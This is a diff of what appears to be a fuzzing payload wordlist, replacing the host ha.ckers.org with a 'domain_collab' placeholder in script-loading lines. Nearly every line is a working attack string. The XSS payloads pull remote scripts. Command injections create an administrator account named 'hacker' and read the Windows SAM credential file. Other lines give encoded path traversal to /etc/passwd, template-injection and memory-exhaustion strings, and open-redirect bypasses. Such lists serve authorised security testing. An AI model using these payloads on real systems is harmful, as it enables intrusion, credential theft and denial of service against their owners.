@@ -3924,7 +3924,7 @@ net user hacker Password1 /ADD
 {% print 'x' * 64 * 1024**3 %}
 /proc/self/fd/35/etc/passwd%00
 --><script>alert(123)</script>
-<SCRIPT SRC=//ha.ckers.org/.j>
+<SCRIPT SRC=//domain_collab/.j>
 & type %SYSTEMROOT%\repair\SAM
 ; type %SYSTEMROOT%\repair\SAM
 | type %SYSTEMROOT%\repair\SAM
@@ -5060,7 +5060,7 @@ Li4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
 && net localgroup Administrators hacker /ADD
 {{request|attr(["_"*2,"class","_"*2]|join)}}
 < / script >< script >alert(123)< / script >
-<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >
+<SCRIPT SRC=http://domain_collab/xss.js?< B >
 "`'><script>\x00javascript:alert(1)</script>
 "`'><script>\x09javascript:alert(1)</script>
 "`'><script>\x0Ajavascript:alert(1)</script>
@@ -5284,7 +5284,7 @@ http://www.whitelisteddomain.tld@0xd8.072.54990
 ../../../../../../../..//etc/passwd%00index.html
 ..\..\..\..\..\..\..\..\/etc/passwd%00index.html
 http://www.whitelisteddomain.tld@472.314.470.462
-<iframe src=http://ha.ckers.org/scriptlet.html <
+<iframe src=http://domain_collab/scriptlet.html <
 <!--[if]><script>javascript:alert(1)</script -->
 Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
 Li4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
@@ -5413,7 +5413,7 @@ http:www.whitelisteddomain.tld@0xd8.0x3a.0xd6.0xce
 \Program Files\Apache Group\Apache\conf\httpd.conf
 /Program Files\Apache Group\Apache\logs\access.log
 \Program Files\Apache Group\Apache\logs\access.log
-<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT/SRC="http://domain_collab/xss.js"></SCRIPT>
 %uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e//etc/passwd
 %uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\/etc/passwd
 /Volumes/Macintosh_HD1/opt/apache2/conf/httpd.conf
@@ -5627,7 +5627,7 @@ C:/program files/mysql/mysql server 5.0/data/mysql.log
 http:www.whitelisteddomain.tld@[::ffff:216.58.214.206]
 javascript://www.whitelisteddomain.tld?%a0alert%281%29
 /Program Files\Apache Group\Apache2\conf\httpd.conf%00
-<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT/XSS SRC="http://domain_collab/xss.js"></SCRIPT>
 ../../../../../../../usr/local/apache/logs/access. log
 ../../../../../../../usr/local/apache/logs/access_ log
 /Volumes/Macintosh_HD1/usr/local/php/httpd.conf.php%00
@@ -6520,7 +6520,7 @@ Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUw
 %c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\boot.ini
 ..........................................................................//etc/passwd
 ..........................................................................\/etc/passwd
-<HTML xmlns:xss><?import namespace="xss" implementation="http://ha.ckers.org/xss.htc">
+<HTML xmlns:xss><?import namespace="xss" implementation="http://domain_collab/xss.htc">
 %uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/boot.ini
 %uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\boot.ini
 <xml SRC="xsstest.xml" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
@@ -6844,7 +6844,7 @@ Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4v
 %c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\/etc/passwd
 %c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae//etc/passwd
 %c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\/etc/passwd
-<HTML xmlns:xss><?import namespace="xss" implementation="http://ha.ckers.org/xss.htc"><xss:xss>XSS</xss:xss></HTML>
+<HTML xmlns:xss><?import namespace="xss" implementation="http://domain_collab/xss.htc"><xss:xss>XSS</xss:xss></HTML>
 %uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e//etc/passwd
 %uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\/etc/passwd
 %252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd
